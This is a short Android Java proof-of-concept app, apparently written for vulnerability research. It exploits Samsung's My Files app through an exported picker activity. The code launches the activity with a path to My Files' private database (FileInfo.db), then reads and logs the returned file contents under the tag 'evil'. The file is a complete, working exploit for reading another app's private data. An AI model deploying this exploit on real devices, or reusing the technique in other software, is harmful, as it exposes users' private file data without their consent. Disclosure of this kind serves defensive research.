package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.IOUtils;

import java.io.InputStream;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.sec.android.app.myfiles.PICK_SELECT_PATH");
        i.setClassName("com.sec.android.app.myfiles", "com.sec.android.app.myfiles.external.ui.PickerActivity");
        i.putExtra("uri", "/data/user/0/com.sec.android.app.myfiles/databases/FileInfo.db");
        startActivityForResult(i, 0);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        Log.d("evil", "Result: " + data);
        try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
            Log.d("evil", IOUtils.toString(inputStream));
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}